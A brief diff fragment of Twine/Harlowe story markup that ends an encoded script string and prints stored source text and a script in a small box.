+GJTZCJTI3JTIwJTdEJTI5JTNCJTBBJTdEJTI5JTBB'))
+&lt;/script&gt;")
+}\
+(box:"X",50)[
+(text-size: 0.6)(print: $quelltext)
+(text-size: 0.5) (print: $script)
+]
